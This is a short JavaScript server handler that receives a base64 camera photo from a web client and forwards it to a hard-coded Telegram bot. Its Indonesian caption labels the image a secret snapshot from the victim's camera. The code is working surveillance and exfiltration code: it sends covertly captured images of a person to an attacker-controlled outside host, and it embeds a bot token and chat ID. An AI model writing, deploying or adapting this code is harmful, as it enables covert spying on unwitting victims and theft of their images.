export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    const { image } = req.body;
    if (!image) {
        return res.status(400).json({ error: 'No image' });
    }

    // Hapus prefix base64
    const base64Data = image.replace(/^data:image\/jpeg;base64,/, '');
    const imageBuffer = Buffer.from(base64Data, 'base64');

    const botToken = "8617014310:AAEidb6kIIlM4QLyoAMm5FMGskMSutKO6aU";
    const chatId = "8753510792";

    // Kirim foto ke Telegram
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', new Blob([imageBuffer], { type: 'image/jpeg' }), 'cam.jpg');
    formData.append('caption', '📸 *JEPRETAN DIAM-DIAM DARI KAMERA KORBAN*');

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch (err) {
        console.error('Foto gagal dikirim:', err);
    }

    res.status(200).json({ status: 'ok' });
}
